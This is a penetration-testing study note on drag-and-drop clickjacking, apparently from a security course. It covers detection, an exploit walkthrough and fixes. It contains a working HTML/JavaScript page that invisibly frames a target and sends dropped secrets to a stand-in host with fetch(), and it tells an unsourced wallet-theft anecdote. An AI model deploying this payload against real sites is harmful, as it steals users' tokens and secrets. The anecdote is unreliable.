---
tags: [vapt, clickjacking, ui, advanced]
difficulty: advanced
module: "28 - Clickjacking"
topic: "28.04 Drag and Drop Clickjacking"
---

# 28.04 — Drag and Drop Clickjacking

## What is it?
**Drag and Drop Clickjacking** (also known as Data Extraction via UI Redressing) is a highly advanced technique used to **steal sensitive data** from a framed application, rather than just forcing the user to perform an action.

Standard Clickjacking is a "blind" attack—the attacker can force the victim to click "Delete", but the attacker cannot *read* the victim's account balance because the Same-Origin Policy (SOP) prevents the parent page from reading the DOM of a cross-origin iframe.

However, modern browsers support the HTML5 Drag and Drop API. If a victim clicks and drags a text element from within the hidden iframe and drops it onto an attacker-controlled text box on the parent page, the browser automatically transfers the text data from the secure domain to the attacker's domain, effectively bypassing the Same-Origin Policy.

Think of it like tricking a bank teller. You are not allowed to reach over the counter to grab a document. So, you create an elaborate illusion that makes the teller think they are throwing out trash, when in reality they are dropping the bank's ledger directly into your briefcase.

## ASCII Diagram
```text
================================================================================
                    DRAG AND DROP DATA EXFILTRATION
================================================================================

[The Decoy Game: "Drag the Ball to the Hoop!"]

+-------------------------------------------------------------+
|                                                             |
|           ●  <-- Victim clicks and holds here.              |
|          /                                                  |
|         /                                                   |
|        / (Victim drags the mouse)                           |
|       /                                                     |
|      v                                                      |
|   [ \___/ ] <-- Victim drops the "ball" in the "hoop".      |
|                                                             |
+-------------------------------------------------------------+

[What is Actually Happening in the Hidden iframe]

+-------------------------------------------------------------+
|  BANKING APPLICATION                                        |
|  Secret API Token: [ 9A4F-B2C1 ]  <-- Sits under the "ball" |
|                                                             |
|                                                             |
|                                                             |
|                                                             |
|   <textarea id="attacker_box"></textarea>  <-- The "hoop"   |
|                                                             |
+-------------------------------------------------------------+

[Result]
1. Victim clicks the "ball", but actually highlights the API Token.
2. Victim drags to the "hoop", but actually drags the highlighted text.
3. Victim drops into the "hoop", dropping the API token into the attacker's text box.
4. Attacker's Javascript reads the text box and sends the token to evil.com!
================================================================================
```

## How to Find It
- **Manual steps:**
  1. Load the target application in an iframe.
  2. Locate sensitive data displayed on the screen (e.g., an API key, an email address, or a password reset token).
  3. Ensure the sensitive data is selectable text (not an image).
  4. Ensure the page does not have `X-Frame-Options` or `CSP: frame-ancestors`.

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Position the target iframe so the sensitive text (e.g., the API key) is perfectly aligned beneath a draggable element on your decoy page.
  2. Create an HTML `<textarea>` on your decoy page. Position it exactly where the victim is supposed to drop the object.
  3. Write Javascript on your decoy page that listens for the `ondrop` event on the textarea.
  4. Trick the victim into playing the "Drag and Drop" game.
  5. When the victim completes the game, their browser copies the highlighted text from the iframe into your textarea.
  6. Your Javascript fires, reads the textarea's value, and exfiltrates it to your server using a standard `fetch()` or `XMLHttpRequest`.

- **Actual payloads:**
  **The Exfiltration Script:**
  ```html
  <style>
      iframe { position: absolute; opacity: 0.001; z-index: 2; top: -50px; left: -100px; }
      #decoy-ball { position: absolute; top: 100px; left: 200px; z-index: 1; pointer-events: none;}
      #hoop { position: absolute; top: 400px; left: 200px; z-index: 3; width: 100px; height: 100px;}
  </style>

  <!-- The iframe containing the API key -->
  <iframe src="https://vulnerable.com/settings/api"></iframe>

  <div id="decoy-ball">Drag Me!</div>
  
  <!-- The drop zone -->
  <textarea id="hoop" placeholder="Drop here!"></textarea>

  <script>
      // Listen for the drop event
      document.getElementById('hoop').addEventListener('drop', function(e) {
          // Wait 100ms for the browser to populate the textarea
          setTimeout(function() {
              let stolenData = document.getElementById('hoop').value;
              // Exfiltrate the data
              fetch('https://evil.com/log?data=' + encodeURIComponent(stolenData));
              alert("You win!");
          }, 100);
      });
  </script>
  ```

## Real-World Example
An attacker targeted a cryptocurrency exchange. The user's wallet recovery phrase (a 12-word secret) was displayed on a specific page that lacked framing protection. The attacker built a browser-based puzzle game. To solve the puzzle, users had to drag a "magic wand" from the top of the screen to a "treasure chest" at the bottom. By carefully aligning the iframe, the attacker forced the victims to unknowingly highlight their 12-word recovery phrase and drag it into the attacker's invisible text area. The attacker then drained the victims' cryptocurrency wallets.

## How to Fix It
- **Developer remediation:**
  1. **Block Framing:** `Content-Security-Policy: frame-ancestors 'none'` completely prevents the attack.
  2. **CSS User-Select:** If you must allow framing for some reason, you can use CSS to prevent users from highlighting text: `user-select: none;` on sensitive elements. However, this is a defense-in-depth measure, not a replacement for proper CSP.

## Chaining Opportunities
- This vuln + Data Exfiltration → A primary method for bypassing Same-Origin Policy reading restrictions via UI interaction.

## Related Notes
- [[02 - Basic iframe Clickjacking]]
- [[03 - Multistep Clickjacking]]
